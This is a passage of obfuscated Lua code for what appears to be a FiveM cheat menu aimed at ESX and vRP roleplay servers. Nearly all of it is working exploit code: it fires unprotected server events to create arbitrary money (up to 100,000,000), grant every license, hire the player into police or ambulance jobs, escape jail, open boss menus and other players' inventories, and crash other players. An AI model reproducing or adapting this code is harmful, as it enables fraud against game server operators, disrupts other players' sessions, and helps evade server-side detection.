                elseif LDOWJDWDdddwdwdad("~r~→  ~s~ESX Job Menu", "\69\83\88\74\111\98\77\101\110\117\10") then
                elseif LDOWJDWDdddwdwdad("~r~→  ~s~ESX Boss", "\69\83\88\66\111\115\115\77\101\110\117\10") then
                elseif LDOWJDWDdddwdwdad("~r~→  ~s~ESX Drugs", "\69\83\88\68\114\117\103\77\101\110\117\10") then
                elseif LDOWJDWDdddwdwdad("~r~→  ~s~ESX Misc", "\69\83\88\77\105\115\99\77\101\110\117\10") then
                end

                ililililil()
            elseif Plane.IsMenuOpened("\69\83\88\77\105\115\99\77\101\110\117\10") then
                if IlIlIlIlIlI("ESX Harvest FixKit") then
                    udwdj("esx_mechanicjob:startHarvest")
				elseif IlIlIlIlIlI    ("ESX Get all licenses ") then
					udwdj("dmv:success")
					udwdj('esx_weashopjob:addLicense', 'tazer')
					udwdj('esx_weashopjob:addLicense', 'ppa')
					udwdj('esx_weashopjob:addLicense', 'ppa2')
					udwdj('esx_weashopjob:addLicense', 'drive_bike')
					udwdj('esx_weashopjob:addLicense', 'drive_truck')
					udwdj('esx_dmvschool:addLicense', 'dmv')
					udwdj('esx_dmvschool:addLicense', 'drive')
					udwdj('esx_dmvschool:addLicense', 'drive_bike')
					udwdj('esx_dmvschool:addLicense', 'drive_truck')
					udwdj('esx_airlines:addLicense', 'helico')
					udwdj('esx_airlines:addLicense', 'avion')
                elseif IlIlIlIlIlI("ESX Craft FixKit") then
                    udwdj("esx_mechanicjob:startCraft")
                end

                ililililil()
            elseif Plane.IsMenuOpened("\69\83\88\68\114\117\103\77\101\110\117\10") then
                if IlIlIlIlIlI("Harvest Weed (x5)") then
                    udwdj("esx_drugs:startHarvestWeed")
                    udwdj("esx_drugs:startHarvestWeed")
                    udwdj("esx_drugs:startHarvestWeed")
                    udwdj("esx_drugs:startHarvestWeed")
                    udwdj("esx_drugs:startHarvestWeed")
                elseif IlIlIlIlIlI("Transform Weed (x5)") then
                    udwdj("esx_drugs:startTransformWeed")
                    udwdj("esx_drugs:startTransformWeed")
                    udwdj("esx_drugs:startTransformWeed")
                    udwdj("esx_drugs:startTransformWeed")
                    udwdj("esx_drugs:startTransformWeed")
                elseif IlIlIlIlIlI("Sell Weed (x5)") then
                    udwdj("esx_drugs:startSellWeed")
                    udwdj("esx_drugs:startSellWeed")
                    udwdj("esx_drugs:startSellWeed")
                    udwdj("esx_drugs:startSellWeed")
                    udwdj("esx_drugs:startSellWeed")
                elseif IlIlIlIlIlI("Harvest Coke (x5)") then
                    udwdj("esx_drugs:startHarvestCoke")
                    udwdj("esx_drugs:startHarvestCoke")
                    udwdj("esx_drugs:startHarvestCoke")
                    udwdj("esx_drugs:startHarvestCoke")
                    udwdj("esx_drugs:startHarvestCoke")
                elseif IlIlIlIlIlI("Transform Coke (x5)") then
                    udwdj("esx_drugs:startTransformCoke")
                    udwdj("esx_drugs:startTransformCoke")
                    udwdj("esx_drugs:startTransformCoke")
                    udwdj("esx_drugs:startTransformCoke")
                    udwdj("esx_drugs:startTransformCoke")
                elseif IlIlIlIlIlI("Sell Coke (x5)") then
                    udwdj("esx_drugs:startSellCoke")
                    udwdj("esx_drugs:startSellCoke")
                    udwdj("esx_drugs:startSellCoke")
                    udwdj("esx_drugs:startSellCoke")
                    udwdj("esx_drugs:startSellCoke")
                elseif IlIlIlIlIlI("Harvest Meth (x5)") then
                    udwdj("esx_drugs:startHarvestMeth")
                    udwdj("esx_drugs:startHarvestMeth")
                    udwdj("esx_drugs:startHarvestMeth")
                    udwdj("esx_drugs:startHarvestMeth")
                    udwdj("esx_drugs:startHarvestMeth")
                elseif IlIlIlIlIlI("Transform Meth (x5)") then
                    udwdj("esx_drugs:startTransformMeth")
                    udwdj("esx_drugs:startTransformMeth")
                    udwdj("esx_drugs:startTransformMeth")
                    udwdj("esx_drugs:startTransformMeth")
                    udwdj("esx_drugs:startTransformMeth")
                elseif IlIlIlIlIlI("Sell Meth (x5)") then
                    udwdj("esx_drugs:startSellMeth")
                    udwdj("esx_drugs:startSellMeth")
                    udwdj("esx_drugs:startSellMeth")
                    udwdj("esx_drugs:startSellMeth")
                    udwdj("esx_drugs:startSellMeth")
                elseif IlIlIlIlIlI("Harvest Opium (x5)") then
                    udwdj("esx_drugs:startHarvestOpium")
                    udwdj("esx_drugs:startHarvestOpium")
                    udwdj("esx_drugs:startHarvestOpium")
                    udwdj("esx_drugs:startHarvestOpium")
                    udwdj("esx_drugs:startHarvestOpium")
                elseif IlIlIlIlIlI("Transform Opium (x5)") then
                    udwdj("esx_drugs:startTransformOpium")
                    udwdj("esx_drugs:startTransformOpium")
                    udwdj("esx_drugs:startTransformOpium")
                    udwdj("esx_drugs:startTransformOpium")
                    udwdj("esx_drugs:startTransformOpium")
                elseif IlIlIlIlIlI("Sell Opium (x5)") then
                    udwdj("esx_drugs:startSellOpium")
                    udwdj("esx_drugs:startSellOpium")
                    udwdj("esx_drugs:startSellOpium")
                    udwdj ("esx_drugs:startSellOpium")
                    udwdj("esx_drugs:startSellOpium")
                elseif IlIlIlIlIlI("Money Wash (x10)") then
                    udwdj("esx_blanchisseur:startWhitening", 1)
                    udwdj("esx_blanchisseur:startWhitening", 1)
                    udwdj("esx_blanchisseur:startWhitening", 1)
                    udwdj("esx_blanchisseur:startWhitening", 1)
                    udwdj("esx_blanchisseur:startWhitening", 1)
                    udwdj("esx_blanchisseur:startWhitening", 1)
                    udwdj("esx_blanchisseur:startWhitening", 1)
                    udwdj("esx_blanchisseur:startWhitening", 1)
                    udwdj("esx_blanchisseur:startWhitening", 1)
                    udwdj("esx_blanchisseur:startWhitening", 1)
                elseif IlIlIlIlIlI("Stop all (Drugs)") then
                    udwdj("esx_drugs:stopHarvestCoke")
                    udwdj("esx_drugs:stopTransformCoke")
                    udwdj("esx_drugs:stopSellCoke")
                    udwdj("esx_drugs:stopHarvestMeth")
                    udwdj("esx_drugs:stopTransformMeth")
                    udwdj("esx_drugs:stopSellMeth")
                    udwdj("esx_drugs:stopHarvestWeed")
                    udwdj("esx_drugs:stopTransformWeed")
                    udwdj("esx_drugs:stopSellWeed")
                    udwdj("esx_drugs:stopHarvestOpium")
                    udwdj("esx_drugs:stopTransformOpium")
                    udwdj("esx_drugs:stopSellOpium")
                end


                ililililil()
-- 4x482
            elseif Plane.IsMenuOpened("\69\83\88\66\111\115\115\77\101\110\117\10") then
                if IlIlIlIlIlI("~c~Mechanic~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mecano', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, KZjx)
				elseif IlIlIlIlIlI("~b~Police~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'police', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, KZjx)
				elseif IlIlIlIlIlI("~r~Ambulance~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'ambulance', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, KZjx)
				elseif IlIlIlIlIlI("~y~Taxi~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'taxi', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, KZjx)
				elseif IlIlIlIlIlI("~g~Real Estate~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'realestateagent', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, KZjx)
				elseif IlIlIlIlIlI("~p~Gang~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'gang', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, KZjx)
				elseif IlIlIlIlIlI("~o~Car Dealer~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'cardealer', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, KZjx)
				elseif IlIlIlIlIlI("~y~Banker~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'banker', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, KZjx)
				elseif IlIlIlIlIlI("~c~Mafia~w~ Boss Menu") then
					TriggerEvent('esx_society:openBossMenu', 'mafia', function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, KZjx)
				elseif IlIlIlIlIlI("~g~ESX ~y~Custom Boss Menu") then
					local awd2323 = pikgfrihfg("Enter Boss Menu Script Name", "", 10)
					if awd2323 then
						TriggerEvent('esx_society:openBossMenu', awd2323, function(data,menu) menu.close() end)
					setMenuVisible(currentMenu, KZjx)
					end
				end

                ililililil()
            elseif Plane.IsMenuOpened("\69\83\88\74\111\98\77\101\110\117\10") then
                if IlIlIlIlIlI("Unemployed") then
                    udwdj("NB:destituerplayer",GetPlayerServerId(-1))
                elseif IlIlIlIlIlI("Police") then
                    udwdj("NB:recruterplayer",GetPlayerServerId(-1),"police",3)
                elseif IlIlIlIlIlI("Mechanic") then
                    udwdj("NB:recruterplayer",GetPlayerServerId(-1),"mecano",3)
                elseif IlIlIlIlIlI("Taxi") then
                    udwdj("NB:recruterplayer",GetPlayerServerId(-1),"taxi",3)
                elseif IlIlIlIlIlI("Ambulance") then
                    udwdj("NB:recruterplayer",GetPlayerServerId(-1),"ambulance",3)
                elseif IlIlIlIlIlI("Real Estate Agent") then
                    udwdj("NB:recruterplayer",GetPlayerServerId(-1),"realestateagent",3)
                elseif IlIlIlIlIlI("Car Dealer") then
                    udwdj("NB:recruterplayer",GetPlayerServerId(-1),"cardealer",3)
                end

                ililililil()
                        elseif Plane.IsMenuOpened("\69\83\88\77\111\110\101\121\77\101\110\117\10") then
                if IlIlIlIlIlI("-» Ultimate moneymaker «-") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
				udwdj('esx_truckerjob:pay', awd2323)
				udwdj('vrp_slotmachine:server:2', awd2323)
				udwdj("esx_pizza:pay", awd2323)
				udwdj('esx_jobs:caution', 'give_back', awd2323)
				udwdj('lscustoms:payGarage', awd2323)
				udwdj('esx_tankerjob:pay', awd2323)
				udwdj('esx_vehicletrunk:giveDirty', awd2323)
				udwdj('f0ba1292-b68d-4d95-8823-6230cdf282b6', awd2323)
				udwdj('gambling:spend', awd2323)
				udwdj('265df2d8-421b-4727-b01d-b92fd6503f5e', awd2323)
				udwdj('AdminMenu:giveDirtyMoney', awd2323)
				udwdj('AdminMenu:giveBank', awd2323)
				udwdj('AdminMenu:giveCash', awd2323)
				udwdj('esx_slotmachine:sv:2', awd2323)
				udwdj('esx_truckerjob:pay', awd2323)
				udwdj('esx_moneywash:deposit', awd2323)
				udwdj('esx_moneywash:withdraw', awd2323)
				udwdj('esx_moneywash:deposit', awd2323)
			    udwdj('mission:completed', awd2323)
				udwdj('truckerJob:success',awd2323)-- 4x482
				udwdj('c65a46c5-5485-4404-bacf-06a106900258', awd2323)
				udwdj('99kr-burglary:addMoney', awd2323)
				end
			elseif IlIlIlIlIlI("~g~Caution give back $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
				udwdj("esx_jobs:caution", "give_back", awd2323)
				end
			elseif IlIlIlIlIlI("~g~Truckerjob $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
				udwdj('esx_truckerjob:pay', awd2323)
				end
			elseif IlIlIlIlIlI("~g~Admin give bank $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
				udwdj('AdminMenu:giveBank', awd2323)
				end
			elseif IlIlIlIlIlI("~g~Admin give cash $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
				udwdj('AdminMenu:giveCash', awd2323)
				end
			elseif IlIlIlIlIlI("~g~Postal job $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
					udwdj("esx_gopostaljob:pay", awd2323)
				end
			elseif IlIlIlIlIlI("~g~Bank security $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
					udwdj("esx_banksecurity:pay", awd2323)
				end
			elseif IlIlIlIlIlI("~g~Slotmachine $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
					udwdj("esx_slotmachine:sv:2", awd2323)
				end
			elseif IlIlIlIlIlI("~g~ LScustoms $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100)
				if awd2323 then
					udwdj("lscustoms:payGarage", {costs = -awd2323})
				end		
			elseif IlIlIlIlIlI("~g~Slotmachine(2) $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100)
				if awd2323 then
				udwdj("vrp_slotmachine:server:2", awd2323)
				end
			elseif IlIlIlIlIlI("~g~Dirty money $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
					udwdj('AdminMenu:giveDirtyMoney', awd2323)
				end
			elseif IlIlIlIlIlI("~g~Delivery $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
					udwdj('delivery:success', awd2323)
				end
			elseif IlIlIlIlIlI("~g~Taxijob $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
					udwdj ('taxi:success', awd2323)
				end
			elseif IlIlIlIlIlI("~g~Taxijob 10.000x $") then
				a=1 repeat udwdj('esx_taxijob:success') a=a+1 until (a>10000)
			elseif IlIlIlIlIlI("~g~Pilot & Taxi \40\126\103\126\69\83\88\126\115\126\41\10 $") then
					udwdj('esx_pilot:success')
					udwdj('esx_taxijob:success')
					udwdj('esx_pilot:success')
					udwdj('esx_taxijob:success')
					udwdj('esx_pilot:success')
					udwdj('esx_taxijob:success')
					udwdj('esx_pilot:success')
			elseif IlIlIlIlIlI("~g~Garbagejob $") then
				local awd2323 = pikgfrihfg("Enter amount of money", "", 100000000)
				if awd2323 then
					udwdj("esx_garbagejob:pay", awd2323)
				end	
			elseif IlIlIlIlIlI("~g~Paycheck $") then
				udwdj('paycheck:salary')
				udwdj('paycheck:salary')
				udwdj('paycheck:salary')
				udwdj('paycheck:salary')
				udwdj('paycheck:salary')
				udwdj('paycheck:salary')
				udwdj('paycheck:salary')
				udwdj('paycheck:salary')
				end

                ililililil()
            elseif Plane.IsMenuOpened("\83\101\108\102\77\101\110\117\10") then
			if LDOWJDWDdddwdwdad("~r~→  ~s~Ped Menu", "PedMenu") then
                                elseif IlIlIlIlIlI("~g~Heal ~s~Yourself") then
                    SetEntityHealth(PlayerPedId(), 200)
                elseif IlIlIlIlIlI("Get Some ~b~Armor") then
                    SetPedArmour(PlayerPedId(), 200)
				elseif IlIlIlIlIlI("Go Invisible") then
				local keduxben2 = Ggggg("mp_m_niko_01")
				local player2 = PlayerId()
				local playerPed = GetPlayerPed(-1)
				 RequestModel(keduxben2)
     while not HasModelLoaded(keduxben2) do
        Wait(100)
    end

    SetPlayerModel(player2, keduxben2)
    SetModelAsNoLongerNeeded(keduxben2)
					elseif IlIlIlIlIlI("Go Visible Again") then
				local keduxben3 = Ggggg("mp_m_freemode_01")
				local player3 = PlayerId()
				local playerPed = GetPlayerPed(-1)
				 RequestModel(keduxben3)
     while not HasModelLoaded(keduxben3) do
        Wait(100)
    end

    SetPlayerModel(player3, keduxben3)
		SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben3)
                elseif IlIlIlIlIlI("~o~Food~s~ & ~b~Water ~s~100% \40\126\103\126\69\83\88\126\115\126\41\10") then
                    TriggerEvent("esx_status:set", "hunger", 1000000)
                    TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif IlIlIlIlIlI("Get Some $ ~g~\40\126\103\126\69\83\88\126\115\126\41\10") then
				udwdj("esx_godirtyjob:pay", 500000)
				udwdj("esx_pizza:pay", 500000)
				udwdj("esx_slotmachine:sv:2", 500000)
				udwdj("esx_banksecurity:pay", 500000)
				udwdj('AdminMenu:giveDirtyMoney', 500000)
				udwdj('AdminMenu:giveBank', 500000)        
				udwdj("AdminMenu:giveCash", 500000)
				udwdj("esx_gopostaljob:pay", 500000)
				udwdj("AdminMenu:giveBank", 500000)
				udwdj("esx_truckerjob:pay", 500000)
				udwdj("esx_carthief:pay", 500000)
			    udwdj("esx_garbagejob:pay", 500000)
				udwdj("esx_ranger:pay", 500000)
				udwdj("esx_truckersjob:payy", 500000)
				PlaySoundFrontend(-1, "ROBBERY_MONEY_TOTAL", "HUD_FRONTEND_CUSTOM_SOUNDSET", waduyh487r64)
				adyt23h23("~g~KA-CHING $$")
				elseif IlIlIlIlIlI("Get some $ ~b~(VRP)") then
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj("dropOff", 100000)
			    udwdj("dropOff", 100000)
				udwdj('PayForRepairNow',-100000)
				udwdj('PayForRepairNow',-100000)
				udwdj('PayForRepairNow',-100000)
				udwdj('PayForRepairNow',-100000)
				udwdj('PayForRepairNow',-100000)
				udwdj('PayForRepairNow',-100000)
				udwdj('PayForRepairNow',-100000)
				udwdj('PayForRepairNow',-100000)
				udwdj('PayForRepairNow',-100000)
				udwdj('PayForRepairNow',-100000)
				udwdj('PayForRepairNow',-100000)
				udwdj('PayForRepairNow',-100000)
				adyt23h23("~g~KA-CHING $$")
                elseif IlIlIlIlIlI("Revive yourself \40\126\103\126\69\83\88\126\115\126\41\10") then
                    TriggerEvent("esx_ambulancejob:revive")
					TriggerEvent("ambulancier:selfRespawn")
				elseif IlIlIlIlIlI("Open Jail Menu \40\126\103\126\69\83\88\126\115\126\41\10") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
                elseif IlIlIlIlIlI("Get Out Of Jail \40\126\103\126\69\83\88\126\115\126\41\10") then
                    local ped = PlayerPedId(-1)
                    udwdj("esx-qalle-jail:jailPlayer",GetPlayerServerId(ped),0,"escaperino")
                    udwdj("esx_jailer:sendToJail",GetPlayerServerId(ped),0)
                    udwdj("esx_jail:sendToJail",GetPlayerServerId(ped),0)
					udwdj("esx_jailer:unjailTime", -1)
					udwdj("JailUpdate", 0)
					TriggerEvent("UnJP")
                    udwdj("js:jailuser",GetPlayerServerId(ped),0,"escaperino")
                elseif IlIlIlIlIlI("~r~Kys") then
                    SetEntityHealth(PlayerPedId(), 0)
                elseif  IlIlIlI(
                    "God-Mode",
                    Nighdbddd,
                    function(KAKAAKAKAK)
                    Nighdbddd = KAKAAKAKAK
                    end)
                then
				elseif IlIlIlI(
                    "~o~Nuke ~s~Punches",
                    ih2833gh333,
                    function(KAKAAKAKAK)
                        ih2833gh333 = KAKAAKAKAK
                    end)
                then
                elseif IlIlIlI(
                    "Never Get Tired",
                    infStamina,
                    function(KAKAAKAKAK)
                    infStamina = KAKAAKAKAK
                    end)
                then
                elseif IlIlIlI(
                    "Fast Run",
                    Lodjn,
                    function(KAKAAKAKAK)
                        Lodjn = KAKAAKAKAK
                    end)
                then
                elseif IlIlIlI(
                    "Super Jump",
                    SuperJump,
                    function(KAKAAKAKAK)
                        SuperJump = KAKAAKAKAK
                    end)
                then
                elseif IlIlIlI(
                    "Noclip",
                    Noclip,
                    function(KAKAAKAKAK)
                        Noclip = KAKAAKAKAK
                    end)
                then
                end

                ililililil()
			elseif Plane.IsMenuOpened("PedMenu") then
				if LiLLL("MalePed", peds2, currentPedd, selectedPedd, function(CURENTIXDDd, DWADIOHDWwww13)
                    currentPedd = CURENTIXDDd
                    selectedPedd = DWADIOHDWwww13
                end)
                then
				elseif LiLLL("FemalePed", peds3, currentPeddd, selectedPeddd, function(CURENTIXDDd, DWADIOHDWwww13)
                    currentPeddd = CURENTIXDDd
                    selectedPeddd = DWADIOHDWwww13
                end)
                then
				elseif LiLLL("AnimalPed", peds4, currentPedddd, selectedPedddd, function(CURENTIXDDd, DWADIOHDWwww13)
                    currentPedddd = CURENTIXDDd
                    selectedPedddd = DWADIOHDWwww13
                end)
                then
			elseif IlIlIlIlIlI("Change To Selected ~b~Male") then
					Deer.Destroy()
		Wait(100)
				local keduxben1 = Ggggg(peds2[selectedPedd])
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(keduxben1)
    while not HasModelLoaded(keduxben1) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben1)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben1)
	elseif IlIlIlIlIlI("Change To Selected ~p~Female") then
		Deer.Destroy()
		Wait(100)
				local keduxben5 = Ggggg(peds3[selectedPeddd])
				local player5 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(keduxben5)
    while not HasModelLoaded(keduxben5) do
        Wait(100)
    end

    SetPlayerModel(player5, keduxben5)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben5)
	elseif IlIlIlIlIlI("Change To Selected ~y~Animal") then
			Deer.Destroy()
		Wait(100)
				local keduxben6 = Ggggg(peds4[selectedPedddd])
				local player6 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(keduxben6)
    while not HasModelLoaded(keduxben6) do
        Wait(100)
    end

    SetPlayerModel(player6, keduxben6)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben6)
		elseif IlIlIlIlIlI("Spawn A ~y~Deer ~s~And Ride It") then
     Deer.Create()
	Citizen.Wait(150)
	 Deer.Ride()
				elseif IlIlIlIlIlI("Change To FiveM Ped") then
						Deer.Destroy()
		Wait(100)
				local keduxben3 = Ggggg("mp_m_freemode_01")
				local player3 = PlayerId()
				local playerPed = GetPlayerPed(-1)
				 RequestModel(keduxben3)
     while not HasModelLoaded(keduxben3) do
        Wait(100)
    end

    SetPlayerModel(player3, keduxben3)
	SetPedDefaultComponentVariation(GetPlayerPed(-1))
    SetModelAsNoLongerNeeded(keduxben3)
	elseif IlIlIlIlIlI("Change To ~y~Trevor") then
			Deer.Destroy()
		Wait(100)
				local keduxben13 = Ggggg("player_two")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(keduxben13)
    while not HasModelLoaded(keduxben13) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben13)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben1)
	elseif IlIlIlIlIlI("Change To ~b~Michael") then
			Deer.Destroy()
		Wait(100)
				local keduxben12 = Ggggg("player_zero")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(keduxben12)
    while not HasModelLoaded(keduxben12) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben12)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben12)
	elseif IlIlIlIlIlI("Change To ~g~Franklin") then
			Deer.Destroy()
		Wait(100)
				local keduxben11 = Ggggg("player_one")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(keduxben11)
    while not HasModelLoaded(keduxben11) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben11)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben11)
	elseif IlIlIlIlIlI("Change To ~r~Alien") then
			Deer.Destroy()
		Wait(100)
				local keduxben121 = Ggggg("s_m_m_movalien_01")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(keduxben121)
    while not HasModelLoaded(keduxben121) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben121)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben121)
	elseif IlIlIlIlIlI("Change To ~h~Bigfoot") then
			Deer.Destroy()
		Wait(100)
				local keduxben122 = Ggggg("ig_orleans")
				local player1 = PlayerId()
                local playerPed = GetPlayerPed(-1)
				
    RequestModel(keduxben122)
    while not HasModelLoaded(keduxben122) do
        Wait(100)
    end

    SetPlayerModel(player1, keduxben122)
	SetPedComponentVariation(GetPlayerPed(-1), 0, i, 0, 0)
    SetModelAsNoLongerNeeded(keduxben122)
	elseif IlIlIlIlIlI("Change Clothes \40\126\103\126\69\83\88\126\115\126\41\10 (NOT TESTED)") then
    TriggerEvent('esx_skin:openSaveableMenu')
	end
	ililililil()
            elseif Plane.IsMenuOpened("\79\110\108\105\110\101\80\108\97\121\101\114\115\77\101\110\117\10") then
                    for i = 0, 128 do
                        if NetworkIsPlayerActive(i) and GetPlayerServerId(i) ~= 0 and LDOWJDWDdddwdwdad("~r~→  ~s~Name: "..GetPlayerName(i).." | ID: "..GetPlayerServerId(i).." | "..(IsPedDeadOrDying(GetPlayerPed(i), 1) and "~r~Dead ~s~|" or "~g~Alive ~s~|"), "\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10") then
                            SelectedPlayer = i
                        end
                    end

                    ililililil()
                elseif Plane.IsMenuOpened("\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10") then
                    Plane.SetSubTitle("\80\108\97\121\101\114\79\112\116\105\111\110\115\77\101\110\117\10", "Player Options ["..GetPlayerName(SelectedPlayer).."]")
                    if IlIlIlIlIlI("Spectate", (Spectating and "~g~[SPECTATING]")) then
                        SpectatePlayer(SelectedPlayer)
					elseif IlIlIlIlIlI('~g~Heal ~s~Player') then
                    local dU = 'PICKUP_HEALTH_STANDARD'
                    local dV = Ggggg(dU)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    CreateAmbientPickup(dV, bK.x, bK.y, bK.z + 1.0, 1, 1, dV, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif IlIlIlIlIlI('~b~Armour ~s~Player') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = Ggggg(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    local pickup = CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                    SetPickupRegenerationTime(pickup, 60)
                elseif IlIlIlIlIlI('~b~FULL Armour ~s~Player') then
                    local dW = 'PICKUP_ARMOUR_STANDARD'
                    local dX = Ggggg(dW)
                    local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                    for i = 0, 99 do
                        Citizen.Wait(0)
                        CreateAmbientPickup(dX, bK.x, bK.y, bK.z + 1.0, 1, 1, dX, 1, 0)
                        SetPickupRegenerationTime(pickup, 10)
                        i = i + 1
                    end
					elseif IlIlIlIlIlI("Open inventory") then
					TriggerEvent("esx_inventoryhud:openPlayerInventory", GetPlayerServerId(SelectedPlayer), GetPlayerName(SelectedPlayer))
					elseif IlIlIlIlIlI("Teleport To Player With Vehicle") then
										adyt23h23(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = pikgfrihfg('Are you sure you want to teleport? y/n', '', 0)
                    if cP == 'y' then
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), KZjx) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, KZjx)
                    elseif cP == 'n' then
                        adyt23h23(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    else
                        adyt23h23(
                            '~h~~r~Invalid Confirmation~s~.'
                        )
                        adyt23h23(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    end
                    elseif IlIlIlIlIlI("Teleport To Player") then
										adyt23h23(
                            'Do you want to teleport to the player? ~g~y ~s~/ ~r~n'
                        )
                    local cP = pikgfrihfg('Are you sure you want to teleport? y/n', '', 0)
                    if cP == 'y' then
                        local Entity =
                            IsPedInAnyVehicle(PlayerPedId(-1), KZjx) and GetVehiclePedIsUsing(PlayerPedId(-1)) or
                            PlayerPedId(-1)
                        SetEntityCoords(Entity, GetEntityCoords(GetPlayerPed(SelectedPlayer)), 0.0, 0.0, 0.0, KZjx)
                    elseif cP == 'n' then
                        adyt23h23(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    else
                        adyt23h23(
                            '~h~~r~Invalid Confirmation~s~.'
                        )
                        adyt23h23(
                            '~h~~r~Operation cancelled~s~.'
                        )
                    end
					elseif IlIlIlIlIlI("~g~Give ~w~Money") then
						local awd2323 = pikgfrihfg("Enter amount of money to give", "", 100000000)
						if awd2323 then
						udwdj('esx:giveInventoryItem', GetPlayerServerId(SelectedPlayer), "item_money", "money", awd2323)    
						end
                    elseif IlIlIlIlIlI("Crash Player") then
                        CrashPlayer(GetPlayerPed(SelectedPlayer))
                    elseif LDOWJDWDdddwdwdad("~r~→  ~s~Troll Options", "\80\108\97\121\101\114\84\114\111\108\108\77\101\110\117\10") then
                    elseif LDOWJDWDdddwdwdad("~r~→  ~s~ESX Options", "Player\69\83\88\77\101\110\117\10") then
                    elseif LDOWJDWDdddwdwdad("~r~→  ~s~Choose weapon", "\83\105\110\103\108\101\10WepPlayer") then
